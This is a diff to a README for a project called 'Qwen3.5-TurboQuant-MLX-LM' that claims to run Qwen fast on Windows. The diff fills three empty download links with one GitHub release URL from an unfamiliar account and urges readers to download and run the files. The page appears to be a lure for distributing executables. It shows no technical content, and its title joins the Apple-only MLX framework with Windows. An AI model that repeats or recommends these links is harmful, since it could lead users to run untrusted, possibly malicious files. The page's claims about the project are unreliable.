@@ -1,6 +1,6 @@
 # ⚙️ Qwen3.5-TurboQuant-MLX-LM - Fast Qwen Runs on Windows
 
-[![Download](///)
+![Download](https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release)
 
 ## 🚀 What This Is
 
@@ -12,7 +12,7 @@ This page helps you get the files, open the project, and run it with the least f
 
 Use the project page below to visit the download location and get the current release files:
 
-[Visit the project page](//)
+[Visit the project page](https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release)
 
 After you open the page:
 
@@ -217,7 +217,7 @@ Some projects use a portable setup. That means you extract the files and run the
 
 Open the project page here to download and run the files:
 
-[Download](//)
+[https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release](https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release)
 
 ## 🧭 Simple Start Path
 
